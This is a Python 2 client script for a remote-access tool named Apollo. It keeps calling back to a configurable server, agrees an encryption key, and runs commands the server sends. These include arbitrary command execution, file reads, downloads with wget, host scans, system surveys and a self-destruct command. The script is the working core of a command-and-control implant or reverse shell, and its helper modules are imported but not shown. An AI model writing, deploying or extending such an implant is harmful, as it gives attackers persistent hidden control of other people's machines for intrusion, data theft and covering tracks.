#!/usr/bin/env python

import socket
import sys
import time

from modules import *


# Change the below details to point to your Apollo server instance
HOST = 'localhost'
PORT = 34463

# seconds to wait before client will attempt to reconnect
CONN_TIMEOUT = 30

# determine system platform
if sys.platform.startswith('win'):
    PLAT = 'win'
elif sys.platform.startswith('linux'):
    PLAT = 'nix'
elif sys.platform.startswith('darwin'):
    PLAT = 'mac'
elif sys.platform.startswith('freebsd'):
    PLAT = 'freebsd'
else:
    print 'This platform is not supported.'
    sys.exit(1)


def client_loop(conn, dhkey):
    while True:
        results = ''

        # Wait to receive data from server
        data = crypto.decrypt(conn.recv(4096), dhkey)

        # Seperate data into command and action
        cmd, _, action = data.partition(' ')

        if cmd == 'kill':
            conn.close()
            return 1

        elif cmd == 'destroy':
            conn.close()
            toolkit.destroy(PLAT)

        elif cmd == 'quit':
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
            break

        elif cmd == 'scan':
            results = scan.single_host(action)

        elif cmd == 'survey':
            results = survey.run(PLAT)

        elif cmd == 'cat':
            results = toolkit.cat(action)

        elif cmd == 'execute':
            results = toolkit.execute(action)

        elif cmd == 'ls':
            results = toolkit.ls(action)

        elif cmd == 'pwd':
            results = toolkit.pwd()

        elif cmd == 'unzip':
            results = toolkit.unzip(action)

        elif cmd == 'wget':
            results = toolkit.wget(action)

        results = results.rstrip() + '\n{} completed.'.format(cmd)

        conn.send(crypto.encrypt(results, dhkey))


def main():
    exit_status = 0

    while True:
        conn = socket.socket()

        try:
            # Connect to Apollo server
            conn.connect((HOST, PORT))
        except socket.error:
            time.sleep(CONN_TIMEOUT)
            continue

        dhkey = crypto.diffiehellman(conn)

        # Function for keeping client alive if the server
        # goes down unexpectedly or there is a network issue.
        try:
            exit_status = client_loop(conn, dhkey)
        except: pass

        if exit_status:
            sys.exit(0)


if __name__ == '__main__':
    main()
